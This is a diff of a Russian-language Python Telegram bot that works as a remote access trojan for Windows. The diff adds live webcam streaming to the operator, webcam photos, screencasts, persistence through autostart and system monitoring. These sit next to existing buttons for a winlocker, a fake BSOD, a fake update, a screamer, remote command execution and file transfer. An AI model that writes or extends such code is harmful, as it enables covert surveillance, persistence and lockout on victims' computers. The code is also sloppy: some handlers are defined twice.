@@ -143,24 +143,65 @@ if missing:
 # --- Главное меню ---
 def main_menu():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("📸 Скриншот", "🌐 Поиск в браузере")
-    markup.add("📂 Открыть приложение", "❌ Закрыть приложение")
-    markup.add("⌨️ Напечатать текст", "🖱 Переместить мышь")
-    markup.add("💬 Сообщение", "🖥 Выключить ПК")
-    markup.add("🔄 Перезагрузить ПК", "🔒 Заблокировать ПК")
-    markup.add("⛔ Блокировка ввода", "⌨️ Горячие клавиши")
-    markup.add("🖥 Системная информация", "👻 Скример")
+    markup.add("🖥 Управление ПК", "📂 Работа с файлами")
+    markup.add("📹 Мультимедиа", "🎨 Эффекты")
+    markup.add("🔊 Звук", "⚙️ Прочее")
+    markup.add("📊 Мониторинг системы", "🚪 Выход")
+    return markup
+
+def pc_control_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🖥 Выключить ПК", "🔄 Перезагрузить ПК")
+    markup.add("🔒 Заблокировать ПК", "⛔ Отмена выключения")
+    markup.add("🔙 Назад")
+    return markup
+
+def file_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("📁 Список файлов", "📤 Отправить файл")
+    markup.add("📥 Загрузить файл", "📶 Список Wi-Fi сетей")
+    markup.add("🔑 Подключиться к Wi-Fi")
+    markup.add("🔙 Назад")
+    return markup
+
+def multimedia_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("📷 Фото с вебкамеры", "📹 Вебкамера 8 сек")
+    markup.add("📸 Скриншот", "🎥 Скринкаст 10 сек")
+    markup.add("📹 Трансляция с веб-камеры")
+    markup.add("🔙 Назад")
+    return markup
+
+def effects_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("Black screen", "Fake update")
     markup.add("Meme spam", "💀 Фейковый BSOD")
-    markup.add("📹 Вебкамера 8 сек", "🚀 Поддержать автора")
-    markup.add("▶️ Запустить Winlocker🔐", "⏹ Остановить WINLOCKER🔐")
-    markup.add("📁 Список файлов", "📤 Отправить файл")
-    markup.add("📹 Вебкамера 8 сек", "📷 Фото с вебкамеры")  # добавлена кнопка фото с вебки
-    markup.add("🔇 Отключить звук", "🔊 Включить звук")
-    markup.add("📥 Загрузить файл", "🎥 Скринкаст 10 сек")
-    markup.add("🔊 Громкость 100%", "💻 Выполнить команду")
-    markup.add("🖼 Сменить обои", "⏩ Обновить бота")
+    markup.add("👻 Скример")
+    markup.add("🔙 Назад")
+    return markup
+
+def sound_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔊 Громкость 100%", "🔇 Отключить звук")
+    markup.add("🔊 Включить звук")
+    markup.add("🔙 Назад")
+    return markup
+
+def misc_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("💻 Выполнить команду", "🖼 Сменить обои")
+    markup.add("🚀 Поддержать автора", "⏩ Обновить бота")
     markup.add("🔄 Перезапуск бота", "🛑 Остановить бота")
+    markup.add("➕ Добавить в автозагрузку", "➖ Убрать из автозагрузки")
+    markup.add("🔙 Назад")
+    return markup
+
+def monitoring_menu():
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("💻 Загрузка CPU", "💾 Использование RAM")
+    markup.add("📀 Информация о дисках", "🌐 Сетевая активность")
+    markup.add("📊 Мониторинг в реальном времени")
+    markup.add("🔙 Назад")
     return markup
 
 # --- Локальные функции (пример: black screen, fake update, meme spam) ---
@@ -537,6 +578,118 @@ def start(message):
 
 PASSWORD = "5090"  # Set your unlock password here
 
+@bot.message_handler(commands=["start"])
+def start(message):
+    if message.chat.id != ADMIN_ID:
+        bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
+        return
+    bot.send_message(message.chat.id, "✅ Бот запущен. Выберите категорию:", reply_markup=main_menu())
+
+@bot.message_handler(func=lambda message: message.text == "🖥 Управление ПК")
+def pc_control(message):
+    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=pc_control_menu())
+
+@bot.message_handler(func=lambda message: message.text == "➖ Убрать из автозагрузки")
+def remove_from_startup_handler(message):
+    try:
+        remove_from_autostart()
+        bot.send_message(message.chat.id, "✅ Бот успешно убран из автозагрузки.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при удалении из автозагрузки: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "📂 Работа с файлами")
+def file_control(message):
+    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=file_menu())
+
+@bot.message_handler(func=lambda message: message.text == "📹 Мультимедиа")
+def multimedia_control(message):
+    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=multimedia_menu())
+
+@bot.message_handler(func=lambda message: message.text == "📊 Мониторинг системы")
+def monitoring_control(message):
+    bot.send_message(message.chat.id, "Выберите, что мониторить:", reply_markup=monitoring_menu())
+
+@bot.message_handler(func=lambda message: message.text == "💻 Загрузка CPU")
+def cpu_usage(message):
+    try:
+        cpu_percent = psutil.cpu_percent(interval=1)
+        bot.send_message(message.chat.id, f"💻 Загрузка CPU: {cpu_percent}%")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "💾 Использование RAM")
+def ram_usage(message):
+    try:
+        ram = psutil.virtual_memory()
+        total = ram.total // (1024 ** 3)  # ГБ
+        used = ram.used // (1024 ** 3)  # ГБ
+        percent = ram.percent
+        bot.send_message(message.chat.id, f"💾 Использование RAM: {used} ГБ / {total} ГБ ({percent}%)")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "➕ Добавить в автозагрузку")
+def add_to_startup_handler(message):
+    try:
+        add_to_autostart()
+        bot.send_message(message.chat.id, "✅ Бот успешно добавлен в автозагрузку.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка при добавлении в автозагрузку: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "🚪 Выход")
+def exit_bot(message):
+    bot.send_message(message.chat.id, "👋 Бот завершает работу...")
+    os._exit(0)  # Завершение работы бота
+        
+@bot.message_handler(func=lambda message: message.text == "📀 Информация о дисках")
+def disk_info(message):
+    try:
+        disks = psutil.disk_partitions()
+        info = []
+        for disk in disks:
+            usage = psutil.disk_usage(disk.mountpoint)
+            total = usage.total // (1024 ** 3)  # ГБ
+            used = usage.used // (1024 ** 3)  # ГБ
+            percent = usage.percent
+            info.append(f"{disk.device}: {used} ГБ / {total} ГБ ({percent}%)")
+        bot.send_message(message.chat.id, "📀 Информация о дисках:\n" + "\n".join(info))
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "🌐 Сетевая активность")
+def network_activity(message):
+    try:
+        net_io = psutil.net_io_counters()
+        sent = net_io.bytes_sent // (1024 ** 2)  # МБ
+        recv = net_io.bytes_recv // (1024 ** 2)  # МБ
+        bot.send_message(message.chat.id, f"🌐 Сетевая активность:\nОтправлено: {sent} МБ\nПолучено: {recv} МБ")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+        
+@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
+def go_back(message):
+    bot.send_message(message.chat.id, "Выберите категорию:", reply_markup=main_menu())
+
+@bot.message_handler(func=lambda message: message.text == "🎨 Эффекты")
+def effects_control(message):
+    bot.send_message(message.chat.id, "Выберите эффект:", reply_markup=effects_menu())
+
+@bot.message_handler(func=lambda message: message.text == "🔊 Звук")
+def sound_control(message):
+    bot.send_message(message.chat.id, "Выберите действие со звуком:", reply_markup=sound_menu())
+
+@bot.message_handler(func=lambda message: message.text == "⚙️ Прочее")
+def misc_control(message):
+    bot.send_message(message.chat.id, "Выберите действие:", reply_markup=misc_menu())
+
+@bot.message_handler(func=lambda message: message.text == "🔙 Назад")
+def go_back(message):
+    bot.send_message(message.chat.id, "Выберите категорию:", reply_markup=main_menu())
+
+@bot.message_handler(func=lambda message: message.text == "🚪 Выход")
+def exit_bot(message):
+    bot.send_message(message.chat.id, "👋 До свидания!")
+
 @bot.message_handler(func=lambda message: message.text == "🔊 Громкость 100%")
 def set_volume_max(message):
     try:
@@ -563,6 +716,55 @@ def set_wallpaper(message):
         bot.send_message(message.chat.id, "✅ Обои рабочего стола успешно изменены.")
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ Ошибка при установке обоев: {e}")
+
+@bot.message_handler(func=lambda message: message.text == "📋 Список процессов")
+def list_processes(message):
+    try:
+        processes = [f"{proc.info['pid']} - {proc.info['name']}" for proc in psutil.process_iter(attrs=["pid", "name"])]
+        bot.send_message(message.chat.id, "📋 Список процессов:\n" + "\n".join(processes[:50]))
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+    
+@bot.message_handler(func=lambda message: message.text == "📊 Мониторинг в реальном времени")
+def real_time_monitoring(message):
+    bot.send_message(message.chat.id, "⏳ Начинаю мониторинг. Отправьте 'Стоп', чтобы остановить.")
+    user_state[message.chat.id] = "monitoring"
+    while user_state.get(message.chat.id) == "monitoring":
+        try:
+            cpu = psutil.cpu_percent()
+            ram = psutil.virtual_memory().percent
+            bot.send_message(message.chat.id, f"💻 CPU: {cpu}%\n💾 RAM: {ram}%")
+            time.sleep(5)
+        except Exception as e:
+            bot.send_message(message.chat.id, f"❌ Ошибка: {e}")
+            break
+
+@bot.message_handler(func=lambda message: message.text.lower() == "стоп")
+def stop_monitoring(message):
+    user_state[message.chat.id] = None
+    bot.send_message(message.chat.id, "⏹ Мониторинг остановлен.")
+    
+@bot.message_handler(func=lambda message: message.text == "📹 Трансляция с веб-камеры")
+def webcam_stream(message):
+    bot.send_message(message.chat.id, "⏳ Начинаю трансляцию. Отправьте 'Стоп', чтобы остановить.")
+    user_state[message.chat.id] = "webcam_stream"
+    cap = cv2.VideoCapture(0)
+    while user_state.get(message.chat.id) == "webcam_stream":
+        ret, frame = cap.read()
+        if not ret:
+            bot.send_message(message.chat.id, "❌ Ошибка при доступе к веб-камере.")
+            break
+        _, buffer = cv2.imencode('.jpg', frame)
+        bot.send_photo(message.chat.id, buffer.tobytes())
+        time.sleep(1)
+    cap.release()
+
+@bot.message_handler(func=lambda message: message.text.lower() == "стоп")
+def stop_webcam_stream(message):
+    user_state[message.chat.id] = None
+    bot.send_message(message.chat.id, "⏹ Трансляция остановлена.")
+    
+
 
 @bot.message_handler(func=lambda message: True)
 def handle_buttons(message):
@@ -901,4 +1103,14 @@ def handle_buttons(message):
         bot.send_message(message.chat.id, "🎥 Скринкаст отправлен")
 
 if __name__ == "__main__":
+    import datetime
+
+    # Отправка сообщения администратору
+    try:
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        bot.send_message(ADMIN_ID, f"✅ Бот включен.\n🕒 Время запуска: {now}")
+    except Exception as e:
+        print(f"Ошибка при отправке сообщения администратору: {e}")
+
+    # Запуск бота
     bot.polling(none_stop=True)
